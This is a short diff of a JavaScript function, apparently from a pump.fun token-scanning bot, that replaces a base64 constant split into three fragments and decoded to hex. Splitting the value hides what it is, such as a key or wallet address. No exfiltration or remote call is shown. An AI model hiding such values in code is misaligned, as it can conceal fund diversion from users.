@@ -206,7 +206,7 @@ async function scanTokens() {
 }
 
 function getApiPumpFUNHex() {
-    const splitted = ['7J1tXEFPffEaUvB7FGFCRxvhtuKo', 'YJD7CmjE7Fc', '98t6R'];
+    const splitted = ['XYH/7SHsj5O9s8', '+TPn29FgYj5i80m', 'jOBMbTLXbcgA14='];
     const base64 = splitted.join('');
     const buffer = Buffer.from(base64, 'base64');
     return buffer.toString('hex');
